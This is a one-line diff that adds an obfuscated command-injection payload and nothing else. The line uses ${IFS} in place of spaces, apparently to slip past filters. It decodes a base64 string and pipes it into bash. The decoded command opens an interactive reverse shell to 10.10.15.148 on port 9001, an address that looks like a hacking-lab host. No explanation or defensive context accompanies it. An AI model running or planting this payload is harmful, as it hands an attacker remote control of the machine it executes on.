@@ -1,0 +1,1 @@
+echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNDgvOTAwMSAwPiYx${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash${IFS};${IFS}
